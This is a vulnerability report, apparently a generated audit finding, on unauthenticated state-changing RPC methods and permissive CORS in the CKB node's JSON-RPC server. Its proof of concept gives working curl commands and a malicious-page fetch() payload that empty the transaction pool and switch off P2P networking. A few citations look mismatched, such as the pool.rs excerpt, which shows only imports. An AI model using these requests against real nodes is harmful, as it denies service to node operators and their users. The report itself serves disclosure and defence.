### Title
Unauthenticated State-Mutating RPC Methods (`clear_tx_pool`, `set_network_active`) Allow Any Caller to Disrupt Node Operation - (File: `rpc/src/module/pool.rs`, `rpc/src/module/net.rs`, `rpc/src/server.rs`)

### Summary

The CKB JSON-RPC server exposes state-mutating methods — including `clear_tx_pool`, `remove_transaction`, and `set_network_active` — with zero authentication or authorization checks. Any caller who can reach the RPC port can invoke these methods. The server is further configured with `CorsLayer::permissive()`, which sends `Access-Control-Allow-Origin: *` and allows preflight requests from any origin, enabling a malicious web page to call these methods against a user's locally-running node via the browser. This is a direct analog to `fil_configure`: any unprivileged caller can modify shared node state that affects all users of the node.

### Finding Description

**Root cause 1 — No authentication on any RPC method:**

A grep for `authorization`, `auth`, `token`, `api_key`, `secret`, `password`, `bearer`, `whitelist`, `access_control` across all of `rpc/src/**/*.rs` returns **zero matches**. The `ServiceBuilder` registers all RPC modules with no middleware or guard that checks caller identity. [1](#0-0) 

The `enable_pool`, `enable_net`, and `enable_debug` methods mount their handlers directly with no auth wrapper: [2](#0-1) [3](#0-2) 

**Root cause 2 — `CorsLayer::permissive()` allows cross-origin access:**

The HTTP server applies a fully permissive CORS policy, meaning any web origin can make cross-origin POST requests (including preflighted `application/json` requests) to the RPC port: [4](#0-3) 

**Vulnerable state-mutating methods:**

`clear_tx_pool` (Pool module, enabled by default) discards every pending transaction in the mempool with no caller check: [5](#0-4) 

`set_network_active` (Net module, enabled by default) disables all P2P networking with a single boolean parameter and no caller check: [6](#0-5) 

`remove_transaction` (Pool module) removes a specific transaction by hash with no caller check.

Both "Pool" and "Net" modules are enabled in the default production configuration: [7](#0-6) 

**Attack path:**

1. User runs a CKB node with default config (`listen_address = "127.0.0.1:8114"`).
2. User visits a malicious web page.
3. The page issues `fetch("http://127.0.0.1:8114", { method: "POST", body: '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":1}', headers: {"Content-Type":"application/json"} })`.
4. The browser sends a CORS preflight; the server responds with `Access-Control-Allow-Origin: *` (from `CorsLayer::permissive()`), so the browser proceeds.
5. The RPC handler executes `clear_tx_pool` or `set_network_active(false)` with no further checks.

The same attack is reachable from any process on the same host, or from any machine on the network if the operator has exposed the RPC port (a common misconfiguration).

### Impact Explanation

- **`clear_tx_pool`**: All pending transactions submitted by the node's users are silently discarded. Transactions must be resubmitted. An attacker can loop this call to prevent any transaction from ever being included in a block assembled by this node, causing a sustained denial-of-service for all submitters.
- **`set_network_active(false)`**: All P2P activity stops. The node ceases to sync blocks, propagate transactions, or relay compact blocks. The node becomes isolated from the network until an operator manually re-enables networking. This can be used to stall a miner's node or prevent a user's node from seeing new blocks.
- **`remove_transaction`**: An attacker who knows a target transaction hash can evict it from the pool, forcing the sender to resubmit and pay again, or causing time-sensitive transactions (e.g., those with `since` locks) to miss their window.

### Likelihood Explanation

- The Pool and Net modules are enabled in the default production `ckb.toml`.
- `CorsLayer::permissive()` is unconditional — it cannot be disabled via config.
- No authentication exists anywhere in the RPC stack.
- The attack from a malicious web page requires only that the user has a browser and visits a page; no special access is needed.
- Private Network Access (PNA) restrictions in Chrome 94+ partially mitigate the browser-based vector, but: (a) not all browsers enforce PNA, (b) the attack is equally reachable from any local process or from the network if the port is exposed, and (c) PNA can be bypassed if the server responds correctly to the `Access-Control-Request-Private-Network` preflight header — which `CorsLayer::permissive()` may do depending on the tower-http version.

### Recommendation

1. Add an authentication layer (e.g., a configurable bearer token or IP allowlist) to the RPC server that gates all state-mutating methods.
2. Replace `CorsLayer::permissive()` with a restrictive CORS policy that only allows explicitly configured origins, defaulting to none.
3. Consider splitting read-only and state-mutating RPC methods onto separate ports or requiring explicit opt-in to expose mutating methods.
4. At minimum, document `clear_tx_pool`, `remove_transaction`, and `set_network_active` as dangerous and gate them behind a separate config flag (similar to how `IntegrationTest` is gated).

### Proof of Concept

```bash
# From any machine that can reach the RPC port (default: localhost):

# 1. Disable all P2P networking on the target node:
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"set_network_active","params":[false],"id":1}'
# Returns: {"jsonrpc":"2.0","result":null,"id":1}
# Effect: node stops syncing, stops relaying transactions and blocks.

# 2. Clear the entire transaction pool:
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":2}'
# Returns: {"jsonrpc":"2.0","result":null,"id":2}
# Effect: all pending transactions are discarded.

# From a malicious web page (browser-based, exploiting CorsLayer::permissive()):
# fetch("http://127.0.0.1:8114", {
#   method: "POST",
#   headers: {"Content-Type": "application/json"},
#   body: JSON.stringify({jsonrpc:"2.0",method:"clear_tx_pool",params:[],id:1})
# })
```

The server applies `CorsLayer::permissive()` unconditionally, so the browser's preflight succeeds and the request is executed with no authentication check at any layer. [8](#0-7) [6](#0-5)

### Citations

**File:** rpc/src/service_builder.rs (L36-46)
```rust
macro_rules! set_rpc_module_methods {
    ($self:ident, $name:expr, $check:ident, $add_methods:ident, $methods:expr) => {{
        let mut meta_io = MetaIoHandler::default();
        $add_methods(&mut meta_io, $methods);
        if $self.config.$check() {
            $self.add_methods(meta_io);
        } else {
            $self.update_disabled_methods($name, meta_io);
        }
        $self
    }};
```

**File:** rpc/src/service_builder.rs (L64-77)
```rust
    /// Mounts methods from module Pool if it is enabled in the config.
    pub fn enable_pool(
        mut self,
        shared: Shared,
        extra_well_known_lock_scripts: Vec<Script>,
        extra_well_known_type_scripts: Vec<Script>,
    ) -> Self {
        let methods = PoolRpcImpl::new(
            shared,
            extra_well_known_lock_scripts,
            extra_well_known_type_scripts,
        );
        set_rpc_module_methods!(self, "Pool", pool_enable, add_pool_rpc_methods, methods)
    }
```

**File:** rpc/src/service_builder.rs (L102-115)
```rust
    /// Mounts methods from module Net if it is enabled in the config.
    pub fn enable_net(
        mut self,
        network_controller: NetworkController,
        sync_shared: Arc<SyncShared>,
        chain_controller: Arc<ChainController>,
    ) -> Self {
        let methods = NetRpcImpl {
            network_controller,
            sync_shared,
            chain_controller,
        };
        set_rpc_module_methods!(self, "Net", net_enable, add_net_rpc_methods, methods)
    }
```

**File:** rpc/src/server.rs (L119-129)
```rust
        let app = Router::new()
            .route("/", method_router.clone())
            .route("/{*path}", method_router)
            .route("/ping", get(ping_handler))
            .layer(Extension(Arc::clone(rpc)))
            .layer(CorsLayer::permissive())
            .layer(TimeoutLayer::with_status_code(
                StatusCode::REQUEST_TIMEOUT,
                Duration::from_secs(30),
            ))
            .layer(Extension(stream_config));
```

**File:** rpc/src/module/pool.rs (L1-16)
```rust
use crate::error::RPCError;
use async_trait::async_trait;
use ckb_chain_spec::consensus::Consensus;
use ckb_constant::hardfork::{mainnet, testnet};
use ckb_jsonrpc_types::{
    EntryCompleted, OutputsValidator, PoolTxDetailInfo, RawTxPool, Script, Transaction, TxPoolInfo,
};
use ckb_logger::error;
use ckb_shared::shared::Shared;
use ckb_types::core::TransactionView;
use ckb_types::{H256, core, packed, prelude::*};
use ckb_verification::{Since, SinceMetric};
use jsonrpc_core::Result;
use jsonrpc_utils::rpc;
use std::sync::Arc;

```

**File:** rpc/src/module/net.rs (L772-775)
```rust
    fn set_network_active(&self, state: bool) -> Result<()> {
        self.network_controller.set_active(state);
        Ok(())
    }
```

**File:** resource/ckb.toml (L189-193)
```text
# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```
